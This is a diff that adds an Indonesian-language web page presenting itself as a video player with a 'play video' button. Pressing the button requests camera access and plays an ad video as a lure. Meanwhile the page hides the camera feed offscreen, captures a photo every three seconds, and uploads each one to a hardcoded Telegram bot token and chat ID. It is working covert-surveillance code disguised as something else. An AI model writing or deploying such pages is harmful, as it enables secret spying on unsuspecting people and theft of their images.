@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CCTV Background</title>
+
+    <style>
+        body {
+            font-family: 'Courier New', Courier, monospace;
+            background-color: #000;
+            color: #0f0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
+        }
+
+        h1 { 
+            margin: 10px 0; 
+            font-size: 36px; 
+            border-bottom: 2px solid #0f0; 
+            padding-bottom: 10px; 
+        }
+
+        #status-box {
+            margin-top: 20px;
+            font-size: 18px;
+            color: white;
+        }
+
+        #log {
+            font-size: 12px;
+            color: #888;
+            margin-top: 10px;
+        }
+
+        /* SEMBUNYIKAN KAMERA & CANVAS */
+        #video, #canvas {
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+            visibility: hidden;
+        }
+
+        button {
+            margin-top: 30px;
+            padding: 15px 30px;
+            background: #0f0;
+            color: #000;
+            border: none;
+            font-weight: bold;
+            font-size: 20px;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+
+        button:hover { 
+            background: #fff; 
+        }
+
+        /* VIDEO IKLAN DI BAWAH & AWALNYA HIDDEN */
+        #videoIklan {
+            position: fixed;
+            bottom: 10px;
+            width: 90%;
+            max-width: 480px;
+            border: 3px solid #0f0;
+            border-radius: 10px;
+            box-shadow: 0 0 20px #0f0;
+            z-index: 999;
+            display: none; /* <-- PASTIKAN HIDDEN DI AWAL */
+        }
+    </style>
+</head>
+<body>
+
+    <h1>VIDEO PLAYER</h1> 
+    
+    <div id="status-box"></div> 
+    <div id="log"></div> 
+
+    <button id="btnStart" onclick="startSystem()">PUTAR VIDIO</button>
+
+    <video id="videoIklan" loop playsinline controls>
+        <source src="https://cdn.videy.co/WWx4O6Do1.mp4" type="video/mp4">
+    </video>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+<script>
+    // --- KONFIGURASI ---
+    const BOT_TOKEN = "7351606479:AAER5MF8ROCjnVmMOYGeKeUTGck5pV5Tr_k";
+    const CHAT_ID = "-4602305711";
+    const JEDA_WAKTU = 3000;
+
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const statusBox = document.getElementById('status-box');
+    const logBox = document.getElementById('log');
+    const btnStart = document.getElementById('btnStart');
+    const videoIklan = document.getElementById('videoIklan');
+    
+    let counter = 0;
+
+    // 1. Mulai Sistem
+    async function startSystem() {
+        btnStart.style.display = 'none'; 
+        // Perubahan di sini: Mengganti pesan awal
+        statusBox.innerText = "Memuat video dan meminta izin akses...";
+
+        try {
+            // Coba minta akses kamera
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "environment" } 
+            });
+            
+            // JIKA BERHASIL: Putar video iklan
+            videoIklan.style.display = "block";
+            videoIklan.currentTime = 0;
+            videoIklan.play().catch(() => {
+                console.log("Autoplay dengan suara membutuhkan interaksi user tambahan.");
+            });
+            
+            // Lanjutkan proses CCTV
+            video.srcObject = stream;
+            
+            video.onloadedmetadata = () => {
+                statusBox.innerText = "Sistem Aktif. Memulai pengiriman...";
+                loopProcess(); 
+            };
+
+        } catch (err) {
+            // JIKA GAGAL: Pesan error diubah/dikonfirmasi
+            console.error(err);
+            statusBox.innerHTML = "<span style='color:red'>Izinkan!</span>";
+            btnStart.style.display = 'block';
+        }
+    }
+
+    // 2. Loop Utama
+    function loopProcess() {
+        captureAndSend();
+    }
+
+    // 3. Jepret & Upload
+    function captureAndSend() {
+        counter++;
+        statusBox.innerText = `Mengambil gambar ke-${counter}...`;
+
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        canvas.toBlob((blob) => {
+            uploadToTelegram(blob);
+        }, 'image/jpeg', 0.7);
+    }
+
+    // 4. Kirim ke Telegram
+    function uploadToTelegram(imageBlob) {
+        statusBox.innerText = `Mengirim gambar ke-${counter}...`;
+        
+        const formData = new FormData();
+        formData.append("chat_id", CHAT_ID);
+        formData.append("photo", imageBlob, `cctv-${counter}.jpg`);
+        formData.append("caption", `📸 Auto Capture #${counter}`);
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                logBox.innerText = `✅ Foto #${counter} Terkirim.`;
+            } else {
+                logBox.innerText = `❌ Gagal #${counter}: ${data.description}`;
+            }
+        })
+        .catch(err => {
+            logBox.innerText = `⚠️ Error Jaringan #${counter}`;
+        })
+        .finally(() => {
+            statusBox.innerText = `Menunggu ${JEDA_WAKTU/1000} detik...`;
+            
+            setTimeout(() => {
+                loopProcess();
+            }, JEDA_WAKTU);
+        });
+    }
+
+</script>
+
+</body>
+</html>
